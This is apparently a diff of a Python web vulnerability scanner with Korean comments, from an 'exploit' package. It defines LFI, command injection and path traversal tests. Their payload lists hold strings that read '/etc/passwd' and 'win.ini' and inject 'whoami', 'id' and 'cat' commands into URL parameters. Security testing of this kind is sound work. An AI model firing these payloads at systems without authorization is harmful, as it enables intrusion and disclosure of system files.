+            "vulnerabilities": vulnerabilities,
+            "tested": True
+        }
+    
+    def test_lfi(self, url: str) -> Dict[str, Any]:
+        """
+        LFI (Local File Inclusion) 테스트
+        """
+        vulnerabilities = []
+        
+        # LFI 페이로드
+        lfi_payloads = [
+            "../../../etc/passwd",
+            "....//....//....//etc/passwd",
+            "..%2F..%2F..%2Fetc%2Fpasswd",
+            "..\\..\\..\\windows\\win.ini",
+            "/etc/passwd",
+            "C:\\windows\\win.ini"
+        ]
+        
+        try:
+            parsed = urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+            
+            params = self._extract_params(url)
+            
+            for param_name in params[:3]:
+                for payload in lfi_payloads[:4]:
+                    try:
+                        test_url = f"{base_url}?{param_name}={quote(payload)}"
+                        response = requests.get(
+                            test_url,
+                            timeout=self.timeout,
+                            verify=False,
+                            headers={"User-Agent": self.user_agent}
+                        )
+                        
+                        # 파일 내용 패턴 확인
+                        if "root:" in response.text or "[fonts]" in response.text or "for 16-bit app support" in response.text:
+                            vulnerabilities.append({
+                                "type": "LFI",
+                                "parameter": param_name,
+                                "payload": payload,
+                                "severity": "HIGH",
+                                "method": "GET"
+                            })
+                            break
+                    except:
+                        continue
+                
+                if vulnerabilities:
+                    break
+            
+        except Exception as e:
+            logger.warning(f"LFI 테스트 실패: {e}")
+        
+        # 신뢰도 스코어링 적용
+        try:
+            from ...core.utils.confidence import enhance_finding_with_confidence
+            
+            for i, vuln in enumerate(vulnerabilities):
+                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
+        except ImportError:
+            # confidence 모듈이 없으면 기본 신뢰도만 추가
+            for vuln in vulnerabilities:
+                if "confidence" not in vuln:
+                    vuln["confidence"] = vuln.get("confidence", 70)
+        
+        return {
+            "vulnerable": len(vulnerabilities) > 0,
+            "vulnerabilities": vulnerabilities,
+            "tested": True
+        }
+    
+    def test_command_injection(self, url: str) -> Dict[str, Any]:
+        """
+        Command Injection 테스트
+        """
+        vulnerabilities = []
+        
+        # Command Injection 페이로드
+        cmd_payloads = [
+            "; ls",
+            "| whoami",
+            "& dir",
+            "`id`",
+            "$(whoami)",
+            "; cat /etc/passwd",
+            "| type C:\\windows\\win.ini"
+        ]
+        
+        try:
+            parsed = urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+            
+            params = self._extract_params(url)
+            
+            for param_name in params[:3]:
+                for payload in cmd_payloads[:4]:
+                    try:
+                        test_url = f"{base_url}?{param_name}={quote(payload)}"
+                        response = requests.get(
+                            test_url,
+                            timeout=self.timeout,
+                            verify=False,
+                            headers={"User-Agent": self.user_agent}
+                        )
+                        
+                        # 명령어 실행 결과 패턴 확인
+                        if "uid=" in response.text or "gid=" in response.text or "[fonts]" in response.text:
+                            vulnerabilities.append({
+                                "type": "Command Injection",
+                                "parameter": param_name,
+                                "payload": payload,
+                                "severity": "CRITICAL",
+                                "method": "GET"
+                            })
+                            break
+                    except:
+                        continue
+                
+                if vulnerabilities:
+                    break
+            
+        except Exception as e:
+            logger.warning(f"Command Injection 테스트 실패: {e}")
+        
+        # 신뢰도 스코어링 적용
+        try:
+            from ...core.utils.confidence import enhance_finding_with_confidence
+            
+            for i, vuln in enumerate(vulnerabilities):
+                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
+        except ImportError:
+            # confidence 모듈이 없으면 기본 신뢰도만 추가
+            for vuln in vulnerabilities:
+                if "confidence" not in vuln:
+                    vuln["confidence"] = vuln.get("confidence", 70)
+        
+        return {
+            "vulnerable": len(vulnerabilities) > 0,
+            "vulnerabilities": vulnerabilities,
+            "tested": True
+        }
+    
+    def test_path_traversal(self, url: str) -> Dict[str, Any]:
+        """
+        Path Traversal 테스트
+        """
+        vulnerabilities = []
+        
+        # Path Traversal 페이로드
+        traversal_payloads = [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\win.ini",
+            "....//....//etc/passwd",
+            "/etc/passwd%00",
+            "..%2F..%2F..%2Fetc%2Fpasswd"
+        ]
+        
+        try:
+            parsed = urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+            
+            # URL 경로에 직접 삽입
+            for payload in traversal_payloads[:3]:
+                try:
+                    test_url = urljoin(base_url, payload)
+                    response = requests.get(
+                        test_url,
+                        timeout=self.timeout,
+                        verify=False,
+                        headers={"User-Agent": self.user_agent}
+                    )
+                    
+                    if "root:" in response.text or "[fonts]" in response.text:
+                        vulnerabilities.append({
+                            "type": "Path Traversal",
+                            "payload": payload,
+                            "severity": "HIGH",
+                            "method": "GET"
+                        })
+                        break
+                except:
+                    continue
+            
+        except Exception as e:
+            logger.warning(f"Path Traversal 테스트 실패: {e}")
+        
+        # 신뢰도 스코어링 적용
+        try:
+            from ...core.utils.confidence import enhance_finding_with_confidence
+            
+            for i, vuln in enumerate(vulnerabilities):
+                vulnerabilities[i] = enhance_finding_with_confidence(vuln)
+        except ImportError:
+            # confidence 모듈이 없으면 기본 신뢰도만 추가
+            for vuln in vulnerabilities:
+                if "confidence" not in vuln:
+                    vuln["confidence"] = vuln.get("confidence", 70)
+        
+        return {
+            "vulnerable": len(vulnerabilities) > 0,
+            "vulnerabilities": vulnerabilities,
+            "tested": True
+        }
+    
+    def _test_auth_session(self, url: str) -> Dict[str, Any]:
+        """인증 및 세션 관리 테스트"""
+        try:
+            from .auth_session import AuthSessionTester
+            tester = AuthSessionTester(timeout=self.timeout)
+            return {
+                "broken_authentication": tester.test_broken_authentication(url),
+                "oauth_oidc": tester.test_oauth_oidc(url),
+                "api_keys": tester.test_api_keys(url)
+            }
+        except Exception as e:
+            logger.warning(f"인증/세션 테스트 실패: {e}")
+            return {"tested": False, "error": str(e)}
+    
+    def _test_nosql_injection(self, url: str) -> Dict[str, Any]:
+        """NoSQL Injection 테스트"""
+        try:
+            from .db_advanced import AdvancedDatabaseAttacks
+            tester = AdvancedDatabaseAttacks(timeout=self.timeout)
+            return tester.test_nosql_injection(url)
+        except Exception as e:
+            logger.warning(f"NoSQL Injection 테스트 실패: {e}")
+            return {"tested": False, "error": str(e)}
+    
+    def _test_orm_injection(self, url: str) -> Dict[str, Any]:
+        """ORM Injection 테스트"""
+        try:
+            from .db_advanced import AdvancedDatabaseAttacks
+            tester = AdvancedDatabaseAttacks(timeout=self.timeout)
+            return tester.test_orm_injection(url)
+        except Exception as e:
+            logger.warning(f"ORM Injection 테스트 실패: {e}")
+            return {"tested": False, "error": str(e)}
+    
+    def _extract_params(self, url: str) -> List[str]:
+        """
+        URL에서 파라미터 이름 추출
+        """
+        try:
+            parsed = urlparse(url)
+            params = []
+            
+            # 쿼리 스트링에서 파라미터 추출
+            if parsed.query:
+                for param in parsed.query.split("&"):
+                    if "=" in param:
+                        params.append(param.split("=")[0])
+            
+            # 파라미터가 없으면 기본값 사용
+            if not params:
+                params = ["id", "page", "file", "path", "name", "search", "q", "query"]
+            
+            return params
+        except:
+            return ["id", "page", "file"]
+```
+
+--------------------------------------------------------------------------------
+
+
+================================================================================
+파일 경로: app\core\exploit\__init__.py
+파일 크기: 587 characters
+확장자: .py (python)
+================================================================================
+
+```python
+# app/core/exploit/__init__.py
+
+from .verifier import ExploitVerifier
+from .web_vulnerabilities import WebVulnerabilityScanner
+from .attack_chain import AttackChainBuilder, Vulnerability, AttackStep, AttackPath
+from .latest_vectors import LatestAttackVectors
+from .auth_session import AuthSessionTester
+from .db_advanced import AdvancedDatabaseAttacks
+
+__all__ = [
+    'ExploitVerifier',
+    'WebVulnerabilityScanner',
+    'AttackChainBuilder',
+    'Vulnerability',
+    'AttackStep',
+    'AttackPath',
+    'LatestAttackVectors',
+    'AuthSessionTester',
+    'AdvancedDatabaseAttacks'
+]
+```
+
+--------------------------------------------------------------------------------
